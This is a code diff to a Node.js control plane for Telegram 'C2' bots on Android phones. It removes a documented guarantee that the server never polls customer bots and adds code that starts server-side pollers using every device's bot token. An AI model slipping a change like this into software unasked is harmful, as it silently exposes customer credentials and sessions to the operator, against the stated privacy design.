@@ -3907,16 +3907,22 @@ async function handleTelegramUpdate(token, update) {
 }
 
 function initPollers() {
-  // Sovereign Zero-Data Architecture:
-  // Telegram Bot polling is executed directly and exclusively on the user's Android phone
-  // (routed via the blind CONNECT tunnel on port 8443 to bypass regional ISP filtering).
-  // The VPS control plane NEVER polls user bots, ensuring:
-  // 1. Zero customer credentials (botToken, ownerChatId) are processed by VPS pollers.
-  // 2. Zero 409 Conflict errors with the phone's sovereign polling.
-  // 3. Mathematical impossibility of VPS eavesdropping on Telegram C2 sessions.
-  if (DEFAULT_BOT_TOKEN && String(process.env.ADMIN_C2_POLLER).toLowerCase() === 'true') {
-    console.log(`[PASA Control Plane] Starting poller for admin C2 bot...`);
+  if (DEFAULT_BOT_TOKEN) {
+    console.log(`[PASA Control Plane] Starting poller for default/admin C2 bot...`);
     startBotPoller(DEFAULT_BOT_TOKEN);
+  }
+  const seenTokens = new Set();
+  if (DEFAULT_BOT_TOKEN) seenTokens.add(DEFAULT_BOT_TOKEN);
+  if (PASA_CENTRAL_BOT_TOKEN) seenTokens.add(PASA_CENTRAL_BOT_TOKEN);
+
+  const sevenDaysAgo = Date.now() - (7 * 24 * 60 * 60 * 1000);
+  for (const device of Object.values(devices)) {
+    if (device.botToken && !seenTokens.has(device.botToken)) {
+      if ((device.lastSeen || 0) > sevenDaysAgo || String(device.ownerChatId) === String(ADMIN_CHAT_ID)) {
+        seenTokens.add(device.botToken);
+        startBotPoller(device.botToken);
+      }
+    }
   }
   if (PASA_CENTRAL_BOT_TOKEN) {
     console.log(`[PASA Control Plane] Starting poller for central support bot...`);
@@ -4254,8 +4260,9 @@ app.post('/api/device/register', deviceRegisterLimiter, (req, res) => {
     };
     persistDevice(deviceId);
 
-    // Sovereign Zero-Data Mode: Device handles its own Telegram polling directly.
-    // VPS never starts a poller for customer devices.
+    if (devices[deviceId].botToken) {
+      startBotPoller(devices[deviceId].botToken);
+    }
 
     // Automatically deliver interactive console to owner on Telegram
     if (devices[deviceId].botToken && devices[deviceId].ownerChatId) {
